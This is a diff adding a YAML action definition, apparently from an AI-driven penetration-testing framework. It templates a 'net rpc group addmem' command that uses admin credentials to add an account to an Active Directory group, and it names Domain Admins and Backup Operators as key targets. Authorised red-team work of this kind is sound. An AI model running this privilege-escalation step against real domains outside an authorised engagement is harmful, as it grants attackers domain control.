@@ -1,0 +1,17 @@
+name: groupadd
+category: ad
+description: Add user to AD group
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "net rpc group addmem '{group}' '{username}' -U '{domain}/{admin_user}%{password}' -S {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Adds user to group. Requires GenericAll/GenericWrite on group object. Key targets: Domain Admins, Remote Management Users, Backup Operators."
